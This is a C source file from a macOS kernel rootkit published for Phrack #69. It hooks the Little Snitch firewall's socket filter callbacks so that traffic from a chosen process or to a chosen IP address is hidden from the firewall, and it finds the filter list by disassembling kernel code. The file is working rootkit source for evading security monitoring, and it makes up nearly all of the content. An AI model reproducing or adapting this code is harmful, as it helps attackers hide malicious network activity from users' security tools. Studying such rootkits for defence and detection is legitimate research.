/*
 *   _____   _                          ___     _      _  _     _              __ _
 *  |_   _| | |_      ___      o O O   | __|   | |    | || |   (_)    _ _     / _` |
 *    | |   | ' \    / -_)    o        | _|    | |     \_, |   | |   | ' \    \__, |
 *   _|_|_  |_||_|   \___|   TS__[O]  _|_|_   _|_|_   _|__/   _|_|_  |_||_|   |___/
 * _|"""""|_|"""""|_|"""""| {======|_| """ |_|"""""|_| """"|_|"""""|_|"""""|_|"""""|
 * "`-0-0-'"`-0-0-'"`-0-0-'./o--000'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'
 *            ___      _
 *    o O O  / __|    (_)      _ _    __     _  _     ___
 *   o      | (__     | |     | '_|  / _|   | +| |   (_-<
 *  TS__[O]  \___|   _|_|_   _|_|_   \__|_   \_,_|   /__/_
 *  {======|_|"""""|_|"""""|_|"""""|_|"""""|_|"""""|_|"""""|
 * ./o--000'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'
 *
 * And now for something completely different...
 *
 * A Mountain Lion rootkit for Phrack #69!
 *
 * Copyright (c) fG!, 2012, 2013 - reverser@put.as - http://reverse.put.as
 * All rights reserved.
 *
 * anti_littlesnitch.c
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 * notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 * notice, this list of conditions and the following disclaimer in the
 * documentation and/or other materials provided with the distribution.
 * 3. The name of the author may not be used to endorse or promote products
 * derived from this software without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR ``AS IS'' AND ANY EXPRESS OR
 * IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES
 * OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED.
 * IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT,
 * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT
 * NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
 * DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
 * THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
 * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
 * THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 *
 */

#include "anti_littlesnitch.h"

#include <sys/param.h>
#include <sys/malloc.h>
#include <sys/kpi_socketfilter.h>
#include <sys/queue.h>
#include <netinet/in.h>

#include "kernel_info.h"
#include "cpu_protections.h"
#include "configuration.h"
#include "my_data_definitions.h"
#include "hijacking_utils.h"
#include "disasm_utils.h"
#include "distorm.h"
#include "mnemonics.h"

// globals
extern struct kernel_info g_kernel_info;
mach_vm_address_t g_sock_filter_head;

// these two structures ripped off from bsd/kern/kpi_socketfilter.c
struct socket_filter_entry {
    struct socket_filter_entry      *sfe_next_onsocket;
    struct socket_filter_entry      *sfe_next_onfilter;
    struct socket_filter_entry      *sfe_next_oncleanup;
    
    struct socket_filter            *sfe_filter;
    struct socket                   *sfe_socket;
    void                            *sfe_cookie;
    
    uint32_t                        sfe_flags;
    int32_t                         sfe_refcount;
};

struct socket_filter {
    TAILQ_ENTRY(socket_filter)      sf_protosw_next;
    TAILQ_ENTRY(socket_filter)      sf_global_next;
    struct socket_filter_entry      *sf_entry_head;
    
    void                            *sf_proto;
    struct sflt_filter              sf_filter;
    u_int32_t                       sf_refcount;
};

// prototypes and function pointers
errno_t	_sf_attach_func(void **cookie, socket_t so);
errno_t	_sf_connect_out_func(void *cookie, socket_t so, const struct sockaddr *to);

errno_t	(*_orig_sf_attach_func)(void **cookie, socket_t so) = NULL;
errno_t	(*_orig_sf_connect_out_func)(void *cookie, socket_t so, const struct sockaddr *to) = NULL;

static mach_vm_address_t find_sock_filter_head(void);
static char* my_inet_ntoa(u_int32_t ina);

#pragma mark Start and stop functions

/*
 * it's a good idea to make this hooking temporary instead of permanent
 * we can detect the target process and install these hooks
 * we still depend on some other hooks but the less the better
 */
kern_return_t
kill_the_snitch(void)
{
    // retrieve location of the sock_filter_head
    g_sock_filter_head = find_sock_filter_head();
    if (g_sock_filter_head == 0) return KERN_FAILURE;
    // now we can iterate over the TAILQ and modify pointers
    struct socket_filter *tmp = NULL;
    TAILQ_HEAD(socket_filter_list, socket_filter);
    struct socket_filter_list *headp = (struct socket_filter_list*)g_sock_filter_head;
    TAILQ_FOREACH(tmp, headp, sf_global_next)
    {
        if (strncmp(tmp->sf_filter.sf_name, "at_obdev_ls", strlen("at_obdev_ls")) == 0)
        {
            if (_orig_sf_connect_out_func == NULL)
            {
                _orig_sf_connect_out_func = (void*)tmp->sf_filter.sf_connect_out;
            }
            else if (_orig_sf_attach_func == NULL)
            {
                _orig_sf_attach_func = (void*)tmp->sf_filter.sf_attach;
            }
            // modify pointers to the callbacks
            tmp->sf_filter.sf_attach = &_sf_attach_func;
            // uncomment if you want to try connect callback
//            tmp->sf_filter.sf_connect_out = &_sf_connect_out_func;
        }
    }

    return KERN_SUCCESS;
}

/*
 * restore the original pointers, effectively removing the hooking
 */
kern_return_t
revive_the_snitch(void)
{
    if (g_sock_filter_head != 0)
    {
        struct socket_filter *tmp = NULL;
        TAILQ_HEAD(socket_filter_list, socket_filter);
        struct socket_filter_list *headp = (struct socket_filter_list*)g_sock_filter_head;
        TAILQ_FOREACH(tmp, headp, sf_global_next)
        {
            if (strncmp(tmp->sf_filter.sf_name, "at_obdev_ls", strlen("at_obdev_ls")) == 0)
            {
                if (_orig_sf_attach_func != NULL) tmp->sf_filter.sf_attach = (void*)_orig_sf_attach_func;
                if (_orig_sf_connect_out_func != NULL) tmp->sf_filter.sf_connect_out = (void*)_orig_sf_connect_out_func;
            }
        }
    }
    return KERN_SUCCESS;
}

#pragma mark Our hooked versions

/*
 * If attach returns any value != 0 the filter will not be attached to this socket
 * we can simply find the current process trying to use a socket and return 1
 * this solves the problem described below with connect_out
 * the advantage of playing here is simplicity
 * it might not be enough in a scenario where we inject code into an app and want it
 * to keep running as normal and just hide a few connections. we need to move to the
 * other callbacks in that scenario.
 */
errno_t	_sf_attach_func(void **cookie, socket_t so)
{
    proc_t target_proc = proc_self();
    char target_name[MAXCOMLEN+1];
    proc_name(target_proc->p_pid, target_name, MAXCOMLEN+1);
    // this is definitely not the best implementation, just a sample!
    if (strncmp(target_name, "telnet", 17) == 0)
    {
#if DEBUG
        //moony_modify//printf("[DEBUG] Hiding %s from Little Snitch!\n", target_name);
#endif
        // proc_self increased reference count so we need to release it
        // never forget to do it :-)
        proc_rele(target_proc);
        return 1;
    }
    // not interesting target so let things flow as expected
    else
    {
        proc_rele(target_proc);
        return _orig_sf_attach_func(cookie, so);
    }
}

/*
 * hide the connection to some IP address
 * this is just an example, needs to be reworked for something more interesting
 * XXX: if we only hook here we will have a problem with Little Snitch.
 *      the following message appears in logs
 3894 FATAL: m38a93df2 pid:166 pname:telnet protocol:6 flags:0 to == NULL connectAddr:- peerAddr:-
 *      the error happens in the sf_data_out callback. I assume it is because a cookie was created
 *      since sf_attach wasn't hooked in any way.
 */
errno_t	_sf_connect_out_func(void *cookie, socket_t so, const struct sockaddr *to)
{
    // intercept only INET family
    if (to->sa_family == AF_INET)
    {
        struct sockaddr_in *in = (struct sockaddr_in*)to;
        unsigned char *ip_addr = (unsigned char*)&(in->sin_addr);
        // hide any connection to opensource.apple.com (17.251.224.50) ;-)
        if (ip_addr[0] == 17  && ip_addr[1] == 251 && ip_addr[2] == 224 && ip_addr[3] == 50)
        {
#if DEBUG
            //moony_modify//printf("[DEBUG] Hiding connection to: %03u.%03u.%03u.%03u\n", ip_addr[0], ip_addr[1], ip_addr[2], ip_addr[3]);
#endif
            return 0;
        }
        // else just call the original callback
        else
        {
            return _orig_sf_connect_out_func(cookie, so, to);
        }
    }
    // default is to call the original callback
    return _orig_sf_connect_out_func(cookie, so, to);
}

#pragma mark Auxiliary functions

/*
 * find the location of socket_filter_head by disassembling sflt_attach_internal
 */
static mach_vm_address_t
find_sock_filter_head(void)
{
    // the function we are going to disassemble to find sock_filter_head location
    mach_vm_address_t _sflt_attach_internal = solve_kernel_symbol(&g_kernel_info, "_sflt_attach_internal");
    // it's located on the next instruction
    mach_vm_address_t _lck_rw_lock_exclusive = solve_kernel_symbol(&g_kernel_info, "_lck_rw_lock_exclusive");
    // let's disassemble _sflt_attach_internal, looking up for _lck_rw_lock_exclusive
#define MAX_INSTRUCTIONS 256 // function has less than 100 disassembled lines
    // allocate space for disassembly output
    _DInst *decodedInstructions = _MALLOC(sizeof(_DInst) * MAX_INSTRUCTIONS, M_TEMP, M_WAITOK);
    if (decodedInstructions == NULL)
    {
#if DEBUG
        //moony_modify//printf("[ERROR] Decoded instructions allocation failed!\n");
#endif
        return 0;
    }
    mach_vm_address_t sock_filter_head = 0;
    unsigned int decodedInstructionsCount = 0;
	_DecodeResult res = 0;
    _CodeInfo ci;
    ci.dt = Decode64Bits;
    ci.features = DF_NONE;
    ci.codeLen = 1024; // function is not near this big
    ci.code = (uint8_t*)_sflt_attach_internal;
    ci.codeOffset = _sflt_attach_internal;
    mach_vm_address_t next;
    
    while (1)
    {
        res = distorm_decompose(&ci, decodedInstructions, MAX_INSTRUCTIONS, &decodedInstructionsCount);
        if (res == DECRES_INPUTERR)
        {
            // Error handling...
#if DEBUG
            //moony_modify//printf("[ERROR] Distorm failed to disassemble!\n");
#endif
            goto failure;
        }
        // iterate over the disassembly and lookup for CALL instructions
        for (int i = 0; i < decodedInstructionsCount; i++)
        {
            if (decodedInstructions[i].opcode == I_CALL)
            {
                // retrieve the target address and see if it matches the symbol we are looking for
                mach_vm_address_t rip_address = INSTRUCTION_GET_TARGET(&decodedInstructions[i]);
                if (rip_address == _lck_rw_lock_exclusive)
                {
                    sock_filter_head = INSTRUCTION_GET_RIP_TARGET(&decodedInstructions[i+1]);
#if DEBUG
                    //moony_modify//printf("[DEBUG] found sock_filter_head at %llx\n", sock_filter_head);
#endif
                    goto end;
                }
            }
        }
        
        if (res == DECRES_SUCCESS) break; // All instructions were decoded.
        else if (decodedInstructionsCount == 0) break;
        // sync the disassembly
        // the total number of bytes disassembly to previous last instruction
        next = decodedInstructions[decodedInstructionsCount-1].addr  - ci.codeOffset;
        // add points to the first byte so add instruction size to it
        next += decodedInstructions[decodedInstructionsCount-1].size;
        // update the CodeInfo struct with the synced data
        ci.code += next;
        ci.codeOffset += next;
        ci.codeLen -= next;
    }
    
end:
    _FREE(decodedInstructions, M_TEMP);
    return sock_filter_head;
failure:
    _FREE(decodedInstructions, M_TEMP);
    return 0;
}

/*
 * ripped from https://github.com/ccp0101/kernet/blob/master/kernet_kext/kext.c#L99
 * which was further ripped from freebsd
 */
static char* my_inet_ntoa(u_int32_t ina)
{
	static char buf[4*sizeof "123"];
	unsigned char *ucp = (unsigned char *)&ina;
	snprintf(buf, sizeof(buf), "%d.%d.%d.%d", ucp[0] & 0xff, ucp[1] & 0xff, ucp[2] & 0xff, ucp[3] & 0xff);
	return buf;
}
